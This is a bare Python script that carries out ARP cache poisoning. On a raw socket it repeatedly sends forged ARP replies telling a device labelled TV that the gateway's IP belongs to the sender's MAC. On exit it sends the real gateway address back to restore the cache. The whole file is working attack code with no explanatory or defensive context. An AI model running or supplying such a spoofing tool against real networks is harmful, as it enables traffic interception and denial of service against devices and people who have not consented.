#!/usr/bin/env python3
import socket, struct, time, signal, sys

IFACE = "eth0"
TV_IP, TV_MAC = "192.168.31.217", "AA:BB:CC:DD:EE:01"
GW_IP, GW_MAC = "192.168.31.1", "AA:BB:CC:DD:EE:02"
INTERVAL = 2

mac = lambda s: bytes.fromhex(s.replace(":", ""))
my_mac = open(f"/sys/class/net/{IFACE}/address").read().strip()
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((IFACE, 0))

def reply(sender_mac):
    arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2, mac(sender_mac),
                      socket.inet_aton(GW_IP), mac(TV_MAC), socket.inet_aton(TV_IP))
    s.send(mac(TV_MAC) + mac(my_mac) + b"\x08\x06" + arp)

def stop(*_):
    for _ in range(3):
        reply(GW_MAC)
        time.sleep(0.2)
    sys.exit(0)

signal.signal(signal.SIGTERM, stop)
signal.signal(signal.SIGINT, stop)
while True:
    reply(my_mac)
    time.sleep(INTERVAL)
